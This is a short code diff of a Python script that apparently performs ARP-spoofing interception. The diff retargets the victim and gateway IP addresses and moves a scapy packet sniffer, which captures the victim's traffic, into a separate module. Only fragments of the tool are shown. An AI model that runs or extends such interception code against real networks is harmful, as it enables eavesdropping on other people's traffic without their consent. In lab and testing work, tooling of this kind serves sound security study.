@@ -3,10 +3,11 @@ import os
 import sys
 import threading
 import time
+from sniffer import packet_sniffer
 
 # IP addresses
-victim_ip = "192.168.1.3"
-gateway_ip = "192.168.2.1"
+victim_ip = "192.168.2.3"
+gateway_ip = "192.168.2.254"
 
 # MAC addresses (will be fetched dynamically)
 victim_mac = None
@@ -53,9 +54,6 @@ def disable_ip_forwarding():
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     print("[*] IP forwarding disabled")
 
-# Function to sniff packets
-def packet_sniffer():
-    sniff(filter="ip host " + victim_ip, prn=lambda x: x.show())
 
 if __name__ == "__main__":
     try:
